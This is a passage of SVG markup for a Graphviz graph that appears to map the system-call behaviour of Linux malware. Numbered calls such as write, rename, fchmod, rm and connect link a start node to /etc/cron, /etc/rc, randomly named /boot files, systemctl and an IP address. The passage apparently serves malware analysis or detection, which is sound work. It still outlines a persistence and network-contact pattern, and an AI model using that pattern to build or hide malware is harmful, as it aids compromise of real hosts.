font-size=\"14.00\">15.write</text>\n</g>\n<!-- 2 -->\n<g id=\"node3\" class=\"node\">\n<title>2</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"265.69\" cy=\"-178\" rx=\"33.6\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"265.69\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/rc</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge4\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.45,-263.61C2129.16,-261.43 231.61,-250.23 210.69,-229 198.81,-216.95 213.53,-204.12 230.72,-194.48\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"232.56,-197.47 239.81,-189.75 229.32,-191.26 232.56,-197.47\"/>\n<text text-anchor=\"middle\" x=\"227.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">21.rm</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge5\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.27,-263.57C2134.45,-261.25 287.29,-249.5 266.69,-229 260.74,-223.08 259.14,-214.5 259.46,-206.11\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"262.93,-206.51 260.62,-196.17 255.98,-205.69 262.93,-206.51\"/>\n<text text-anchor=\"middle\" x=\"286.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">32.lstat</text>\n</g>\n<!-- Start&#45;&gt;2 -->\n<g id=\"edge6\" class=\"edge\">\n<title>Start&#45;&gt;2</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.32,-264C2152.5,-263.83 450.81,-261.28 343.69,-229 324.25,-223.14 305.02,-210.9 290.51,-200\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"292.59,-197.19 282.55,-193.8 288.29,-202.71 292.59,-197.19\"/>\n<text text-anchor=\"middle\" x=\"366.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">22.write</text>\n</g>\n<!-- 3 -->\n<g id=\"node4\" class=\"node\">\n<title>3</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"498.69\" cy=\"-178\" rx=\"42.79\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"498.69\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/cron</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge7\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.23,-264.25C2150.32,-265.34 436.02,-267.94 397.69,-229 377.39,-208.38 414.26,-194.89 449.01,-187.19\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"450.11,-190.53 459.19,-185.07 448.68,-183.68 450.11,-190.53\"/>\n<text text-anchor=\"middle\" x=\"420.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">18.write</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge8\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.41,-264.21C2158.19,-265.08 502.76,-266.68 465.69,-229 457.57,-220.75 462.75,-210.23 471.19,-200.97\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"473.75,-203.36 478.47,-193.88 468.86,-198.35 473.75,-203.36\"/>\n<text text-anchor=\"middle\" x=\"488.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">16.open</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge9\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.52,-263.65C2167.13,-261.82 579.92,-252.65 534.69,-229 524.63,-223.74 516.73,-214.25 510.92,-204.95\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"513.96,-203.21 505.99,-196.22 507.86,-206.65 513.96,-203.21\"/>\n<text text-anchor=\"middle\" x=\"563.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">48.rename</text>\n</g>\n<!-- Start&#45;&gt;3 -->\n<g id=\"edge10\" class=\"edge\">\n<title>Start&#45;&gt;3</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.59,-263.47C2183.92,-260.95 722.54,-249.34 627.69,-229 611.14,-225.45 608.4,-220.29 592.69,-214 575.39,-207.08 556.13,-199.83 539.57,-193.73\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"540.76,-190.44 530.17,-190.29 538.36,-197.01 540.76,-190.44\"/>\n<text text-anchor=\"middle\" x=\"650.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">17.lseek</text>\n</g>\n<!-- 4 -->\n<g id=\"node5\" class=\"node\">\n<title>4</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"833.69\" cy=\"-178\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"833.69\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/etc/sed</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge11\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.16,-264.06C2181.9,-264.18 717.7,-262.61 684.69,-229 651.93,-195.64 729.77,-184.54 784.83,-180.84\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"785.05,-184.34 794.81,-180.24 784.62,-177.35 785.05,-184.34\"/>\n<text text-anchor=\"middle\" x=\"715.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">47.fchmod</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge12\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.38,-264C2192.21,-263.81 800.15,-261.07 768.69,-229 755.46,-215.52 773.4,-202.58 793.76,-193.24\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"795.36,-196.37 803.18,-189.22 792.61,-189.93 795.36,-196.37\"/>\n<text text-anchor=\"middle\" x=\"790.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">43.fcntl</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge13\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.34,-263.93C2199.94,-263.43 865.24,-259.54 834.69,-229 828.75,-223.07 827.16,-214.48 827.47,-206.1\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"830.95,-206.5 828.64,-196.16 824,-205.68 830.95,-206.5\"/>\n<text text-anchor=\"middle\" x=\"857.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">45.write</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge14\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.31,-263.71C2214.45,-262.31 981.03,-255.29 902.69,-229 897.84,-227.37 878.08,-212.9 860.94,-199.94\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"862.89,-197.03 852.81,-193.76 858.65,-202.6 862.89,-197.03\"/>\n<text text-anchor=\"middle\" x=\"923.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">44.fstat</text>\n</g>\n<!-- Start&#45;&gt;4 -->\n<g id=\"edge15\" class=\"edge\">\n<title>Start&#45;&gt;4</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.46,-263.99C2235.17,-263.72 1134.8,-260.56 981.69,-229 964.31,-225.42 961.39,-220.01 944.69,-214 922.14,-205.89 896.66,-197.78 875.81,-191.42\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"876.56,-187.99 865.97,-188.44 874.53,-194.69 876.56,-187.99\"/>\n<text text-anchor=\"middle\" x=\"1011.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">46.fchown</text>\n</g>\n<!-- 5 -->\n<g id=\"node6\" class=\"node\">\n<title>5</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1143.69\" cy=\"-178\" rx=\"71.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1143.69\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">[a&#45;zA&#45;z]:d{1,5}$</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge16\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.46,-263.73C2226.79,-262.44 1076.96,-255.87 1050.69,-229 1035.23,-213.19 1054.98,-201.18 1080.19,-192.9\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1081.5,-196.16 1090.05,-189.91 1079.47,-189.46 1081.5,-196.16\"/>\n<text text-anchor=\"middle\" x=\"1086.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">2.exit_group</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge17\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.33,-263.6C2238.64,-261.85 1169.49,-253.89 1144.69,-229 1138.76,-223.05 1137.17,-214.47 1137.49,-206.08\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1140.96,-206.48 1138.65,-196.15 1134.01,-205.67 1140.96,-206.48\"/>\n<text text-anchor=\"middle\" x=\"1171.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">41.umask</text>\n</g>\n<!-- Start&#45;&gt;5 -->\n<g id=\"edge18\" class=\"edge\">\n<title>Start&#45;&gt;5</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.4,-264.22C2265.73,-264.68 1358.39,-263.6 1232.69,-229 1221.3,-225.87 1197.65,-212.44 1177.59,-200.29\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1179.33,-197.25 1168.97,-195.02 1175.67,-203.23 1179.33,-197.25\"/>\n<text text-anchor=\"middle\" x=\"1261.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">12.shmget</text>\n</g>\n<!-- 6 -->\n<g id=\"node7\" class=\"node\">\n<title>6</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1473.69\" cy=\"-178\" rx=\"27.1\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1473.69\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/run/</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge19\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.44,-263.38C2260.18,-260.98 1324.35,-251.25 1302.69,-229 1262,-187.21 1374.06,-179.86 1435.9,-178.88\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1436.13,-182.38 1446.09,-178.77 1436.05,-175.38 1436.13,-182.38\"/>\n<text text-anchor=\"middle\" x=\"1325.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">56.lseek</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge20\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.37,-263.26C2269.73,-260.53 1392.09,-249.99 1371.69,-229 1348.76,-205.41 1399.02,-191.33 1436.83,-184.39\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1437.83,-187.77 1447.09,-182.62 1436.64,-180.87 1437.83,-187.77\"/>\n<text text-anchor=\"middle\" x=\"1394.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">59.write</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge21\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.59,-263.14C2280.04,-260.06 1458.86,-248.75 1439.69,-229 1430.81,-219.85 1438.01,-208.12 1448.04,-198.32\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1450.48,-200.84 1455.65,-191.59 1445.84,-195.6 1450.48,-200.84\"/>\n<text text-anchor=\"middle\" x=\"1462.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">51.open</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge22\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.45,-263.45C2294.49,-261.46 1553.85,-253.43 1508.69,-229 1498.66,-223.58 1490.88,-213.88 1485.23,-204.46\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1488.3,-202.78 1480.46,-195.66 1482.15,-206.12 1488.3,-202.78\"/>\n<text text-anchor=\"middle\" x=\"1534.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">49.stat64</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge23\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.33,-263.77C2313.89,-262.78 1672.79,-257.45 1582.69,-229 1571.05,-225.32 1570.5,-219.66 1559.69,-214 1542.78,-205.15 1523.11,-197 1506.85,-190.79\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1507.82,-187.42 1497.23,-187.19 1505.37,-193.97 1507.82,-187.42\"/>\n<text text-anchor=\"middle\" x=\"1619.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">70.newfstatat</text>\n</g>\n<!-- Start&#45;&gt;6 -->\n<g id=\"edge24\" class=\"edge\">\n<title>Start&#45;&gt;6</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.3,-263.85C2348.02,-263.02 1861.24,-258.04 1701.69,-229 1680.95,-225.23 1677.09,-219.33 1656.69,-214 1606.55,-200.91 1547.51,-190.5 1510.34,-184.54\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1510.42,-181.01 1500,-182.9 1509.33,-187.92 1510.42,-181.01\"/>\n<text text-anchor=\"middle\" x=\"1720.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">33.stat</text>\n</g>\n<!-- 7 -->\n<g id=\"node8\" class=\"node\">\n<title>7</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1738.69\" cy=\"-178\" rx=\"31.7\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1738.69\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^sed$</text>\n</g>\n<!-- Start&#45;&gt;7 -->\n<g id=\"edge25\" class=\"edge\">\n<title>Start&#45;&gt;7</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.53,-263.31C2332.55,-261.16 1783.23,-253.16 1752.69,-229 1745.68,-223.45 1742,-214.7 1740.12,-206.06\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1743.58,-205.54 1738.65,-196.16 1736.66,-206.56 1743.58,-205.54\"/>\n<text text-anchor=\"middle\" x=\"1774.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">38.exec</text>\n</g>\n<!-- 8 -->\n<g id=\"node9\" class=\"node\">\n<title>8</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"1940.69\" cy=\"-178\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"1940.69\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/proc/</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge26\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.29,-263.51C2340.59,-261.9 1830.77,-255.19 1805.69,-229 1775.75,-197.74 1848.1,-185.89 1898.04,-181.5\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1898.63,-184.96 1908.32,-180.67 1898.07,-177.98 1898.63,-184.96\"/>\n<text text-anchor=\"middle\" x=\"1842.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">69.newfstatat</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge27\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.79,-263.04C2358.93,-260.42 1924.35,-251.75 1902.69,-229 1893.8,-219.66 1901.23,-208.28 1911.81,-198.73\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1914.33,-201.19 1919.88,-192.16 1909.91,-195.76 1914.33,-201.19\"/>\n<text text-anchor=\"middle\" x=\"1930.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">68.access</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge28\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.66,-263.26C2380.34,-261.23 2029.12,-253.94 1980.69,-229 1969.94,-223.47 1961.11,-213.62 1954.51,-204.11\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1957.41,-202.15 1949.07,-195.62 1951.51,-205.93 1957.41,-202.15\"/>\n<text text-anchor=\"middle\" x=\"2008.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">1.readlink</text>\n</g>\n<!-- Start&#45;&gt;8 -->\n<g id=\"edge29\" class=\"edge\">\n<title>Start&#45;&gt;8</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2539.11,-262.29C2410.66,-258.88 2157.37,-249.71 2070.69,-229 2054.23,-225.07 2051.41,-220.26 2035.69,-214 2016.4,-206.32 1994.68,-198.27 1976.89,-191.84\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"1978.04,-188.53 1967.45,-188.44 1975.67,-195.12 1978.04,-188.53\"/>\n<text text-anchor=\"middle\" x=\"2093.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">19.open</text>\n</g>\n<!-- 9 -->\n<g id=\"node10\" class=\"node\">\n<title>9</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2298.69\" cy=\"-178\" rx=\"32.49\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2298.69\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/boot/</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge30\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.27,-264.1C2407.66,-263.45 2155.02,-258.36 2127.69,-229 2089.14,-187.59 2192.98,-179.83 2255.41,-178.77\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2255.84,-182.27 2265.8,-178.65 2255.76,-175.27 2255.84,-182.27\"/>\n<text text-anchor=\"middle\" x=\"2153.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">54.stat64</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge31\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2538.41,-262.99C2424.88,-260.7 2223.96,-253.23 2201.69,-229 2181.5,-207.04 2222.84,-193.17 2257.66,-185.76\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2258.6,-189.14 2267.72,-183.75 2257.23,-182.28 2258.6,-189.14\"/>\n<text text-anchor=\"middle\" x=\"2221.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">6.lseek</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge32\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2539.36,-261.75C2441.4,-258.06 2281.83,-249.03 2263.69,-229 2255.41,-219.86 2261.89,-208.7 2271.42,-199.25\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2273.96,-201.67 2279.1,-192.41 2269.31,-196.44 2273.96,-201.67\"/>\n<text text-anchor=\"middle\" x=\"2287.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">10.clone</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge33\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2539.71,-261.32C2468.56,-257.61 2368.3,-248.94 2334.69,-229 2325.03,-223.27 2317.24,-213.83 2311.41,-204.69\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2314.29,-202.67 2306.23,-195.79 2308.23,-206.19 2314.29,-202.67\"/>\n<text text-anchor=\"middle\" x=\"2353.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">8.write</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge34\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2541.35,-259.95C2497.74,-255.69 2442.24,-246.94 2395.69,-229 2384.3,-224.61 2383.34,-219.96 2372.69,-214 2359.94,-206.87 2345.5,-199.82 2332.78,-193.94\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2333.99,-190.65 2323.44,-189.69 2331.09,-197.02 2333.99,-190.65\"/>\n<text text-anchor=\"middle\" x=\"2415.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">4.open</text>\n</g>\n<!-- Start&#45;&gt;9 -->\n<g id=\"edge35\" class=\"edge\">\n<title>Start&#45;&gt;9</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2560.54,-252.35C2533.78,-246.22 2501.31,-238.1 2472.69,-229 2455.39,-223.5 2451.96,-219.61 2434.69,-214 2402.72,-203.62 2365.73,-194.27 2338.41,-187.85\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2338.97,-184.39 2328.44,-185.53 2337.39,-191.2 2338.97,-184.39\"/>\n<text text-anchor=\"middle\" x=\"2489.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">25.rm</text>\n</g>\n<!-- 10 -->\n<g id=\"node11\" class=\"node\">\n<title>10</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"2681.69\" cy=\"-178\" rx=\"53.09\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"2681.69\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">^systemctl$</text>\n</g>\n<!-- Start&#45;&gt;10 -->\n<g id=\"edge36\" class=\"edge\">\n<title>Start&#45;&gt;10</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2554.13,-254.04C2524.07,-246.47 2497.51,-233.89 2513.69,-214 2527.13,-197.47 2578,-188.48 2620.27,-183.77\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2620.67,-187.25 2630.25,-182.72 2619.94,-180.29 2620.67,-187.25\"/>\n<text text-anchor=\"middle\" x=\"2553.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">71.getsockopt</text>\n</g>\n<!-- Start&#45;&gt;10 -->\n<g id=\"edge37\" class=\"edge\">\n<title>Start&#45;&gt;10</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2611.9,-246.59C2610.64,-236.37 2610.8,-223.63 2616.69,-214 2621.2,-206.61 2627.86,-200.68 2635.22,-195.96\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2637.1,-198.92 2644.09,-190.96 2633.66,-192.82 2637.1,-198.92\"/>\n<text text-anchor=\"middle\" x=\"2638.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">35.exec</text>\n</g>\n<!-- Start&#45;&gt;10 -->\n<g id=\"edge38\" class=\"edge\">\n<title>Start&#45;&gt;10</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2640.43,-247.71C2647.3,-242.35 2654.33,-235.96 2659.69,-229 2665.04,-222.06 2669.4,-213.61 2672.78,-205.65\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2676.04,-206.91 2676.42,-196.32 2669.52,-204.36 2676.04,-206.91\"/>\n<text text-anchor=\"middle\" x=\"2714.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">73.getsockname</text>\n</g>\n<!-- Start&#45;&gt;10 -->\n<g id=\"edge39\" class=\"edge\">\n<title>Start&#45;&gt;10</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2683.44,-256.18C2717.36,-250.73 2753.37,-242.05 2763.69,-229 2776.65,-212.62 2757.3,-200.3 2734.15,-191.99\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2735.04,-188.6 2724.45,-188.78 2732.84,-195.24 2735.04,-188.6\"/>\n<text text-anchor=\"middle\" x=\"2792.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">36.wait4</text>\n</g>\n<!-- Start&#45;&gt;10 -->\n<g id=\"edge40\" class=\"edge\">\n<title>Start&#45;&gt;10</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2691.24,-260.96C2742.28,-257.14 2803.24,-248.51 2819.69,-229 2844.61,-199.44 2791.53,-187.36 2744.14,-182.42\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"2744.44,-178.93 2734.15,-181.47 2743.77,-185.9 2744.44,-178.93\"/>\n<text text-anchor=\"middle\" x=\"2866.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">72.setsockopt</text>\n</g>\n<!-- 11 -->\n<g id=\"node12\" class=\"node\">\n<title>11</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3052.69\" cy=\"-178\" rx=\"38.99\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3052.69\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">ip_addr</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge41\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2689.86,-259.66C2749.77,-255.08 2835.95,-246.07 2909.69,-229 2946.48,-220.49 2986.98,-205.8 3015.46,-194.53\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3017.02,-197.68 3025,-190.71 3014.42,-191.18 3017.02,-197.68\"/>\n<text text-anchor=\"middle\" x=\"2992.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">66.connect</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge42\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2691.83,-261.53C2803.28,-257.32 3000.62,-247.36 3027.69,-229 3035.74,-223.54 3041.32,-214.68 3045.13,-205.93\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3048.51,-206.88 3048.72,-196.28 3041.95,-204.44 3048.51,-206.88\"/>\n<text text-anchor=\"middle\" x=\"3062.69\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">62.send</text>\n</g>\n<!-- Start&#45;&gt;11 -->\n<g id=\"edge43\" class=\"edge\">\n<title>Start&#45;&gt;11</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2693.01,-263.9C2820.25,-262.93 3062.39,-257.32 3088.69,-229 3096.93,-220.13 3090.85,-209.33 3081.5,-200.05\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3083.7,-197.32 3073.9,-193.29 3079.05,-202.55 3083.7,-197.32\"/>\n<text text-anchor=\"middle\" x=\"3132.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">64._newselect</text>\n</g>\n<!-- 12 -->\n<g id=\"node13\" class=\"node\">\n<title>12</title>\n<ellipse fill=\"none\" stroke=\"black\" cx=\"3382.69\" cy=\"-178\" rx=\"66.89\" ry=\"18\"/>\n<text text-anchor=\"middle\" x=\"3382.69\" y=\"-174.3\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">/boot/[a&#45;z]{10}</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge44\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2691.83,-261.56C2822.75,-256.99 3085.16,-246.01 3175.69,-229 3197.24,-224.95 3201.51,-219.68 3222.69,-214 3254.64,-205.43 3290.6,-197.42 3320.32,-191.23\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3321.06,-194.65 3330.15,-189.2 3319.65,-187.79 3321.06,-194.65\"/>\n<text text-anchor=\"middle\" x=\"3239.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">26.rm</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge45\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2693.21,-264.75C2840.08,-265.35 3153.37,-262.48 3255.69,-229 3267.29,-225.2 3267.71,-219.32 3278.69,-214 3294.16,-206.5 3311.66,-199.94 3327.82,-194.58\"/>\n<polygon fill=\"black\" stroke=\"black\" points=\"3329.23,-197.81 3337.68,-191.41 3327.09,-191.14 3329.23,-197.81\"/>\n<text text-anchor=\"middle\" x=\"3304.19\" y=\"-217.8\" font-family=\"Times New Roman,serif\" font-size=\"14.00\">55.stat64</text>\n</g>\n<!-- Start&#45;&gt;12 -->\n<g id=\"edge46\" class=\"edge\">\n<title>Start&#45;&gt;12</title>\n<path fill=\"none\" stroke=\"black\" d=\"M2692.78,-263.23C2865.38,-261.07 3272.35,-253.42 